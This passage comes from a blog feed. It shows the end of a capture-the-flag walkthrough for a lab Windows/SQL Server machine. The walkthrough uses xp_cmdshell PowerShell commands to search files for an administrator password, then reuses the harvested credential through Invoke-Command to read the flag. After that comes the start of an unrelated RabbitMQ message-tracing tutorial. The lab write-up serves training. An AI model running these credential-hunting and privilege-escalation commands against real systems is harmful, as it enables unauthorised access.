<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path C:\Users\sql_svc </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">File</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We then pipe the list of all files and folders into the following command:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-Content</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This will read the contents of each file that was piped into the command and print it to the console.
The last part of the command performs a case-insensitive search for the word ‘administrator’ in all the piped content:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Putting it all together and displaying the output, we see that one of the files that was read had a command that included the word ‘administrator’!</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL&gt; xp_cmdshell </span><span class="token string" style="color:#e3116c">"powershell "</span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path C:\Users\sql_svc </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Get-Content</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><span class="token string" style="color:#e3116c">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain">   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe use T: \\Archetype\backups </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">user:administrator MEGACORP_4dm1n!</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">            </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The command <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)" target="_blank" rel="noopener noreferrer">maps the T drive to the backups share using the administrator account</a>. And we can see that the last argument includes the administrator password!
All that’s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.
The attempt for the former failed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py ARCHETYPE/administrator:MEGACORP_4dm1n</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> -windows-auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">'ARCHETYPE\administrator'</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is because there’s no such user in the database (logged in with <code>sql_svc</code> user):</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">database_principals</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dbo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">guest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">INFORMATION_SCHEMA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">##MS_PolicyEventProcessingLogin##</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">##MS_AgentSigningCertificate##</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_owner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_accessadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_securityadmin </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_ddladmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_backupoperator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_datareader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_datawriter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_denydatareader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_denydatawriter                               </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So I needed to try the latter approach: run the command to read the flag as administrator.
I did some research and found <a href="https://superuser.com/a/1421775/506517" target="_blank" rel="noopener noreferrer">a way to do this using PowerShell</a>. I ran the following command to specify the administrator credentials and print the contents of the flag:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">"powershell "</span><span class="token plain">$username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">\"administrator\"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$password</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">\"MEGACORP_4dm1n</span><span class="token operator" style="color:#393A34">!</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">\"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$pass </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ConvertTo</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">SecureString </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">AsPlainText $Password </span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">Force</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$Cred </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> New</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Object System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Management</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Automation</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PSCredential </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ArgumentList $Username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">$pass</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">Invoke</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ComputerName \"Archetype\" </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Credential $Cred </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ScriptBlock {Get</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Content C:\Users\Administrator\Desktop\root</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt} </span><span class="token string" style="color:#e3116c">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b91ccec3305e98240082d4474b848528</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Capture_the_flag" term="Capture_the_flag"/>
        <category label="Ctf" term="Ctf"/>
        <category label="Cybersecurity" term="Cybersecurity"/>
        <category label="Hacking" term="Hacking"/>
        <category label="Smb" term="Smb"/>
        <category label="Windows" term="Windows"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Trace/Read RabbitMQ Messages]]></title>
        <id>https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages</id>
        <link href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>This week, I needed to debug a production issue where one of the critical ReactJS applications happened to load exactly after 60 seconds.</p>
<p>When I opened the browser development tools network tab, I saw that the request was stuck in Pending state indicating that it was waiting for the server to respond.</p>
<p>As I am already quite familiar with the relevant GraphQL server which works as a backend for this ReactJS application, I knew that the constant 60 seconds response time was no coincidence. It was a hardcoded RabbitMQ RPC (Remote Procedure Call) timeout which is configured systemwide. This means that any microservice in the cluster has 60 seconds to respond to the RPC, and if it doesn’t do so by that interval, the message is dropped. In order to further debug the issue, I needed to somehow figure out which RPC call was stuck as neither the RabbitMQ or the GraphQL services DEBUG/TRACE logs had printed information about these RPCs.</p>
<p><img decoding="async" loading="lazy" src="https://www.cloudamqp.com/img/blog/workflow-rabbitmq.png" alt="broker" class="img_ev3q"></p>
<p>Microservices use the RabbitMQ message broker to transfer messages between them. These messages, when consumed by the destination service, will <a href="https://developer.mozilla.org/en-US/docs/Glossary/TCP_handshake" target="_blank" rel="noopener noreferrer"><code>ACK</code></a> with a response message to the service which requested the information. Once the reply was accepted by the requesting service, the message is deleted from the queue.</p>
<p><img decoding="async" loading="lazy" src="https://www.cloudamqp.com/img/blog/exchanges-bidings-routing-keys.png" alt="queue" class="img_ev3q"></p>
<p>In some cases, such as investigation of this issue, we would need to be able to review which messages were published and consumed in the RabbitMQ message broker prior to deletion.</p>
<p>This tutorial will explain how to enable message tracing to be able to review the messages published and consumed. It was created because I found it very frustrating that the official RabbitMQ documentation for this feature and its relevant plugin were unclear, not up-to-date and not procedural.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="disclaimer-for-performance-degradation">Disclaimer for Performance Degradation<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#disclaimer-for-performance-degradation" class="hash-link" aria-label="Direct link to Disclaimer for Performance Degradation" title="Direct link to Disclaimer for Performance Degradation">​</a></h2>
<p>Enabling message tracing is a very costly operation and increases the processing and memory consumption of the <a href="https://www.erlang.org/doc/man/erl.html" target="_blank" rel="noopener noreferrer"><code>erl</code></a> process/RabbitMQ container.</p>
<p>You might need to increase the <a href="https://www.rabbitmq.com/memory.html#threshold" target="_blank" rel="noopener noreferrer">RabbitMQ memory watermark</a> and/or the RabbitMQ container memory/CPU limits in the environment where you’re debugging. It is mandatory to clean up thereafter (see last section on how to do so).</p>
<p>The environment where this issue was occurring was in an Ubuntu server running a Kubernetes 3-node cluster where the RabbitMQ container was running as a ClusterIP Service (which means it’s only exposed to internally). With some minor modifications, it could also be tweaked to be relevant for Windows environments.</p>
<p>Follow <a href="https://www.rabbitmq.com/management-cli.html" target="_blank" rel="noopener noreferrer">these instruction&nbsp;on how to set up <code>rabbitmqadmin</code> for Windows environments</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="configuration-optional">Configuration (Optional)<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#configuration-optional" class="hash-link" aria-label="Direct link to Configuration (Optional)" title="Direct link to Configuration (Optional)">​</a></h2>
<p>We can create a configuration file which we will use to authenticate the commands we’ll send to the RabbitMQ service. This will save us some time as we won’t need to specify mandatory arguments for every command we type and can use the configuration file instead which will include these arguments.
One of the mandatory arguments is the IP where the RabbitMQ service is running. We can retrieve the IP by running the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl get endpoints rabbitmq-ha </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> prod </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">jsonpath</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'{.subsets[0].addresses[0].ip}'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.15</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let’s create a configuration file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token string" style="color:#e3116c">EOT</span><span class="token string bash punctuation" style="color:#393A34"> </span><span class="token string bash punctuation operator" style="color:#393A34">&gt;&gt;</span><span class="token string bash punctuation" style="color:#393A34"> /tmp/rmq.conf</span><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># Name of instance we want to connect to</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[instance]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># Host/IP where the RabbitMQ server is running</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">hostname = 192.168.1.15</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># RabbitMQ credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">username = YOUR_UN</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">password = YOUR_PW</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">EOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nano</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Inside the text editor, specify the following:</p>
<p>Notice that the file follows the <a href="https://docs.python.org/3/library/configparser.html#supported-ini-file-structure" target="_blank" rel="noopener noreferrer">Python INI configuration</a> format. This is because <code>rabbitmqadmin</code> is written in Python.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enabling-tracing-plugin">Enabling Tracing Plugin<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#enabling-tracing-plugin" class="hash-link" aria-label="Direct link to Enabling Tracing Plugin" title="Direct link to Enabling Tracing Plugin">​</a></h2>
<p>RabbitMQ ships by default with a plugin called <code>rabbitmq_tracing</code>.
To enable it, we run the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> rabbitmq-ha-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> rabbitmq-ha </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> prod -- rabbitmq-plugins </span><span class="token builtin class-name">enable</span><span class="token plain"> rabbitmq_tracing</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can verify that the plugin was enabled by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> rabbitmq-ha-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> rabbitmq-ha </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> prod -- rabbitmq-plugins list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
